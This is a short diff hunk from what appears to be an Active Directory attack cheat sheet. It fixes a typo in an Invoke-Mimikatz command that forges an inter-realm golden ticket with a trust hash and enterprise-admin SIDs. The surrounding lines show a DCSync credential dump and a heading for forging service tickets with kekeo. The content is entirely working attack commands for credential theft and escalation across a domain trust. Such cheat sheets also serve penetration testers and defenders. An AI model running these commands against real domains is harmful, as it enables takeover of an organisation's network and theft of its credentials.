@@ -1014,7 +1014,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
 
 #### Create an inter-realm TGT
 ```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtg /target:<target domain> /ticket:<path to save ticket>"'
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:<sid of current domain> /sids:<sid of enterprise admin groups of the parent domain> /rc4:<trust hash> /service:krbtgt /target:<target domain> /ticket:<path to save ticket>"'
 ```
 
 #### Create a TGS for a service (kekeo_old)
